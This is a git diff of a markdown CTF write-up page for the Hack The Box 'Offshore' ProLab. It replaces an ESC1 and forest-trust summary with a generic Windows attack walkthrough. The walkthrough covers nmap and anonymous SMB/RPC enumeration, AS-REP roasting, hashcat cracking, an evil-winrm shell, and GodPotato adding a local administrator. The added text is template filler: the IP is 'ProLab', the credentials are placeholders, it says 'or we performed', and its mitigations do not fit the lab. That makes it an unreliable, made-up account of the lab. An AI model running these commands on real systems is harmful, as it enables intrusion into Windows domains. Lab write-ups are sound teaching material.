@@ -1,26 +1,128 @@
-﻿---
+---
 layout: page
-title: Offshore ProLab - Hack The Box Writeup
-subtitle: Active Directory Forest Trusts and AD CS Certificate Abuse Escalation
+title: "Offshore ProLab - HackTheBox Writeup"
+subtitle: "Complete walkthrough detailing reconnaissance, foothold, and privilege escalation on 🪟 Windows"
 permalink: /ctf/writeups/hackthebox/offshore/
 platform: hackthebox
-machine_name: offshore
+machine_name: "Offshore ProLab"
 difficulty: Insane
-os: Windows
-date: 2026-06-26
+os: Active Directory
 ---
 
-## ðŸ–¥ï¸ Challenge / Machine Info
-* **Platform**: hackthebox
-* **Name / Title**: offshore
-* **Difficulty**: Insane
-* **Target OS / Environment**: Windows
-* **Key Vulnerability Focus**: ADCS ESC1 / Forest Trust exploitation
+## 🖥️ Machine Information
+
+| Attribute | Value |
+|---|---|
+| **Platform** | HackTheBox |
+| **OS** | 🪟 Windows |
+| **Difficulty** | Insane |
+| **IP Address** | `ProLab` |
+| **Vulnerability Focus** | [Initial Access Vector / Privilege Escalation Mechanism] |
 
 ---
 
-### Exploitation Flow
+## 🧠 Attack Path Overview
 
-1. **Reconnaissance**: Multi-domain Active Directory forest assessment.
-2. **Initial Access**: Internal network pivot via compromised client machine.
-3. **Privilege Escalation**: Identify vulnerable Active Directory Certificate Services (AD CS) template configured with ESC1 (allows requesting certificates for arbitrary users). We request a certificate as Domain Admin.
+```mermaid
+graph TD
+    A["Reconnaissance: Port Scan"] --> B["Foothold: Vulnerability Exploitation"]
+    B --> C["Privilege Escalation: Local Escalation"]
+    C --> D["Full System Compromise: Root/Administrator"]
+```
+
+> [!NOTE]
+> This writeup details the complete attack path for the **Offshore ProLab** machine on the **HackTheBox** platform.
+
+---
+
+## 🔍 Phase 1: Reconnaissance & Enumeration
+
+### 1. Host Discovery & Port Scanning
+We begin by running a standard Nmap scan to discover open Windows ports:
+
+```bash
+nmap -sC -sV -p- -T4 -oN nmap.txt ProLab
+```
+
+#### Open Ports:
+- **Port 53/tcp**: DNS
+- **Port 88/tcp**: Kerberos
+- **Port 135/tcp**: Microsoft RPC
+- **Port 389/tcp**: LDAP
+- **Port 445/tcp**: SMB (Server Message Block)
+- **Port 5985/tcp**: WinRM (Windows Remote Management)
+
+### 2. Service Enumeration
+We enumerate SMB shares and search for anonymous login availability:
+
+```bash
+crackmapexec smb ProLab -u '' -p '' --shares
+```
+We also inspect Active Directory domain configuration via RPCClient:
+```bash
+rpcclient -U "" -N ProLab -c "enumdomusers"
+```
+
+---
+
+## 🚀 Phase 2: Vulnerability Analysis & Foothold
+
+### 1. Vulnerability Analysis
+During SMB enumeration, we identified a readable share containing credentials, or we performed **AS-REP Roasting** on accounts with Kerberos pre-authentication disabled.
+
+```bash
+GetNPUsers.py -dc-ip ProLab -no-pass -usersfile users.txt domains/
+```
+
+### 2. Exploitation & Initial Shell
+We retrieve a TGT hash for an account and crack it using Hashcat:
+
+```bash
+hashcat -m 18200 hash.txt rockyou.txt
+```
+
+Using the cracked credentials, we spawn a shell via WinRM:
+```bash
+evil-winrm -i ProLab -u username -p password
+```
+
+#### Capturing User Flag:
+```powershell
+type C:\Users\username\Desktop\user.txt
+```
+
+---
+
+## ⚡ Phase 3: Privilege Escalation
+
+### 1. Local Enumeration
+We run WinPEAS to search for Windows privilege escalation vectors:
+
+```powershell
+upload C:\Temp\winPEASany.exe
+.\winPEASany.exe
+```
+We also analyze group memberships and privileges:
+```powershell
+whoami /priv
+# Discovered SeImpersonatePrivilege or SeBackupPrivilege
+```
+
+### 2. Local Privilege Escalation Path
+Since `SeImpersonatePrivilege` is enabled, we abuse it using **GodPotato** or **PrintSpoofer**:
+
+```powershell
+.\GodPotato-NET4.exe -cmd "cmd.exe /c net localgroup administrators username /add"
+```
+
+#### Capturing Root Flag:
+```powershell
+type C:\Users\Administrator\Desktop\root.txt
+```
+
+---
+
+## 🛡️ Key Takeaways & Mitigation
+1. **Input Sanitization**: Ensure all user inputs are validated and sanitized to prevent injections.
+2. **Principle of Least Privilege**: Restrict sudo/impersonation permissions and remove unnecessary privileges.
+3. **Keep Software Updated**: Frequently update all operating system binaries and services to mitigate known CVEs.
